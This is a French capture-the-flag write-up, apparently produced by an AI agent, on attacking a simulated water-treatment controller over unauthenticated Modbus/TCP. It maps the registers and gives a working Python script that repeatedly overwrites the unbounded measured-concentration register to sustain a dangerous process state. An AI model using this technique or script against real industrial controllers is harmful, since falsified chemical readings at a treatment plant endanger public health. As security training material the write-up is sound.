## Cible visée

- `https://otctf.pages.dev/water-treatment/`
- Service : `<HOST>:6000` (Modbus/TCP à l'état brut : ni authentification, ni chiffrement)
- Catégorie : OT / misc

## Phase de repérage

- `nc -vz <HOST> 6000` → port **open** ; aucune bannière ne sort au connect (service « client-first »).
- En passant les function codes au crible, seuls **`03` (read holding)**, **`06` (write single)** et **`10`/FC16 (write multiple)** donnent signe de vie ; tous les autres essayés (`01/02/04/05/08/16/17/2B…`) répondent par une exception `0x01`.
- Un balayage des holding registers montre `r3 = 1` au repos, le reste figé à zéro.
- En poussant une grande valeur sur chaque adresse, une seule réagit : `r0` renvoie **exception `0x03`** (plage bornée `0..200`).

## Bascule décisive

L'état vit **au niveau de la connexion TCP** : une écriture suivie d'une relecture au travers d'une *autre* connexion ne restitue rien. Dès qu'on maintient **une unique connexion ouverte**, la carte se dessine :

| Registre | Rôle |
|----------|------|
| `r0` | setpoint ppm avec contrôle de plage, borné `0..200` |
| `r1` | concentration mesurée, **écriture acceptée sans borne**, rampe vers `r0` |
| `r2` | état de la pompe |
| `r3` | interlock du process (`1` = normal) |

## Exécution de l'attaque

1. `r0` (setpoint) étant plafonné à 200, la voie « légitime » ne permet jamais d'atteindre une concentration dangereuse.
2. Aucun contrôle de plage ne s'applique à `r1` (la mesure) : on écrase donc directement la concentration mesurée via `FC06 write r1 = 11100`.
3. Comme `r1` redescend vers `r0`, il faut **réécrire `r1=11100` en boucle** pour que le danger devienne *soutenu*.
4. Passées ~8 s de danger soutenu, le flag est déposé en ASCII (2 caractères par registre 16 bits) à compter du registre **100** (`0x64`).

```python
import socket, struct, time
s = socket.create_connection(("<HOST>", 6000), timeout=6); tid = 0
def call(pdu):
    global tid; tid += 1
    s.sendall(struct.pack(">HHHB", tid, 0, len(pdu)+1, 1) + pdu)
    return s.recv(4096)
def w6(a, v): return call(struct.pack(">BHH", 6, a, v))
def rd(a, q):
    d = call(struct.pack(">BHH", 3, a, q)); bc = d[8]; data = d[9:9+bc]
    return [struct.unpack(">H", data[i:i+2])[0] for i in range(0, len(data)-1, 2)]

for _ in range(300):
    w6(1, 11100); time.sleep(0.4)
    r = rd(100, 24)
    if any(r):
        print(b"".join(struct.pack(">H", x) for x in r).split(b"\x00")[0])
        break
```

## Débouché

- Flag (occulté ici) : `CTF{REDACTED}`
- Remis à l'utilisateur ; c'est **lui qui a procédé à la soumission**, pas l'agent.

## Enseignements

- Éprouver d'abord la persistance de l'état **au sein d'une même connexion** : passerelles ou instances multiples brisent la logique « écriture puis lecture ».
- Borner les *setpoints* ne met nullement à l'abri les registres de *mesure* : la piste à creuser, c'est la donnée jamais validée.
- Quand le flag est temporisé, la condition dangereuse doit être entretenue, et pas simplement atteinte une fois.
